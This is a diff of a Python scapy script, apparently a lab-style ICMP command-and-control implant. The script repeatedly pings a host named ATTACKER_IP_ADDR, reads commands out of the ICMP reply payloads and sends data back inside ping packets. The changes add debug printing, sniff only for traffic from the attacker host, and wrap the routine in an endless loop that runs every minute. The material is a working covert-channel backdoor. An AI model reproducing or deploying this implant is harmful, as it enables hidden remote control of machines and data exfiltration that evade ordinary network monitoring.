@@ -9,7 +9,7 @@ ASK_FOR_COMMAND_ID = 220
 START_TRANSMISSION_ID = 240
 ONGOING_TRANSMISSION_ID = 250
 END_TRANSMISSION_ID = 255
-FREQUENCY = 60 * 2  # 60s * 2 = 2 minutes
+FREQUENCY = 60 * 1  # 60s * 1 = 1 minute(s)
 ATTACKER_IP_ADDR = "10.10.10.2"
 DEFAULT_TIMEOUT = None
 DEFAULT_PAYLOAD = b''
@@ -18,7 +18,8 @@ DEFAULT_PAYLOAD = b''
 def send_ping(ip_addr, id, seq_number, payload, timeout, nb_responses=1):
     request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
     scapy.send(request)
-    return receive_response_packet(request, timeout, nb_responses)
+    print("Sending packet:", request.show())
+    return receive_response_packet(timeout, nb_responses)
 
 
 def send_data(ip_addr, id, data):
@@ -68,8 +69,11 @@ def retrieve_command(response):
     return response[scapy.ICMP].payload.load.decode("utf-8").split()  # forge_random_command().decode("utf-8").split()
 
 
-def receive_response_packet(request, timeout, nb_responses):
-    return scapy.sniff(lfilter=lambda response: match_response_to_request(response, request), count=nb_responses, timeout=timeout)
+def receive_response_packet(timeout, nb_responses):
+    packet = scapy.sniff(filter=f"host {ATTACKER_IP_ADDR} and icmp",
+                       count=nb_responses, timeout=timeout)
+    print("Receiving packet:", packet.show())
+    return packet
 
 
 def can_proceed(ip_addr):
@@ -136,7 +140,14 @@ def forge_random_command():
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    if can_proceed(ATTACKER_IP_ADDR):
-        accomplish_routine(ATTACKER_IP_ADDR)
-    else:
+    while True:
+        #try:
+        if can_proceed(ATTACKER_IP_ADDR):
+            accomplish_routine(ATTACKER_IP_ADDR)
+                #except Exception as err:
+            #print(f"Unexpected {err=}, {type(err)=}")
+            #else:
+        #    print("Nothing went wrong!")
+        #finally:
+        #    print(f"See you in {FREQUENCY} min(s)")
         time.sleep(FREQUENCY)
